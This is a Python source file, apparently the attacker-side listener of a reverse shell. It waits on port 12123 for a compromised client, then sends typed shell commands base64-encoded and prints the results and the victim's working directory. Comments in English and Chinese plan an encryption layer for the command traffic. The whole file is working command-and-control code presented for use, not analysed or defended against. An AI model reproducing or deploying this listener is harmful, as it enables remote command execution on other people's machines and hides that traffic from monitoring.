# coding:utf-8
# author:Joseph

import socket
import base64

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 12123
# send 1024 (1kb) a time (as buffer size)
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"

# create a socket object
s = socket.socket()

# bind the socket to all IP addresses of this host
s.bind((SERVER_HOST, SERVER_PORT))
# make the PORT reusable
# when you run the server multiple times in Linux, Address already in use error will raise
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

# accept any connections attempted
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

# receiving the current working directory of the client
cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[+] Current working directory:", cwd)

while True:
    # get the command from prompt
    command = input(f"{cwd} $> ")
    if not command.strip():
        # empty command
        continue
    # send the command to the client
    # !!could ADD encrypted model!!
    # 添加指令加密模块
    # client_socket.send(command.encode())
    client_socket.send(base64.b64encode(command.encode()))
    if command.lower() == "exit":
        # if the command is exit, just break out of the loop
        break
    # retrieve command results
    # !!could ADD encrypted model!!
    # 添加指令解密模块，测试print加密是否生效
    # print("output:", client_socket.recv(BUFFER_SIZE).decode())
    # print("output:", str(base64.b64decode(client_socket.recv(BUFFER_SIZE).decode()),'utf-8'))

    output = str(base64.b64decode(client_socket.recv(BUFFER_SIZE).decode()),'utf-8')
    # print("output:", output)
    # output = client_socket.recv(BUFFER_SIZE).decode()

    # print("output:", output)
    # split command output and current directory
    results, cwd = output.split(SEPARATOR)
    # print output
    print(results)
# close connection to the client
client_socket.close()
# close server connection
s.close()

